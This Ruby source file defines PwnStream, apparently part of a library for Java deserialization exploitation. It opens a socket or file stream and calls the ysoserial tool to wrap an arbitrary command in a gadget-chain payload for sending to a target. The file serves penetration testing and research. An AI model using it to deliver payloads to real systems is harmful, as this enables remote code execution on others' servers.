require 'socket'
require 'open3'
require_relative 'ObjectInputStream'
require_relative 'ObjectOutputStream'
require_relative 'Utils'

module ObjectPwnStream
  class PwnStream
      @host = nil
      @port = nil
      @socket = nil
      @file_path, @file_mode = nil
      @instream, @outstream = nil
      @payload = nil

      include ObjectOutputStream
      include ObjectInputStream
      attr_reader :instream, :outstream
      def initialize(host: nil, port: nil, file_path: nil, connect: false)
        if file_path.nil?
          @host = host
          @port = port.to_i
          connect! if connect
        else
          @file_mode = true
          @file_path = file_path
          connect! if connect
        end
      end

      def connect!
        unless @file_mode
          @socket ||= TCPSocket.open(@host, @port)
          @socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
          @socket.sync = true
          @instream = @outstream = @socket
        else
          @outstream ||= File.open(@file_path, 'wb')
          @instream ||= File.open(@file_path, 'rb')
          @outstream.sync = true
        end
      end

      def close!
        @outstream.flush
        @outstream.close
        @instream.close
        @socket, @file_path, @instream, @outstream, @file_mode = nil
      end

      def ysoserial_generate!(ysoserial_path, gadget, cmd, java_path: nil, encode: false, windows: false)
        cmd = Utils.exec_encode(cmd, windows: windows) if encode
        ycmd = "#{java_path && '"'}#{java_path || 'java'}#{java_path && '"'} -jar \"#{ysoserial_path}\" #{gadget} \"#{cmd}\""
        stdout = Open3.capture3(ycmd, :binmode => true)[0]
        if stdout.empty?
          raise Errors::YsoserialGenerateError.new(ycmd)
        else
          ObjectInputStream.check_stream_header(stdout[...4].unpack("S>*"), provided: false)
          @payload = stdout[4..]
        end
      end

      alias_method :open_input_stream!, :open_input_stream
      alias_method :open_output_stream!, :open_output_stream
      def open_streams!
        open_output_stream
        open_input_stream
      end
  end
end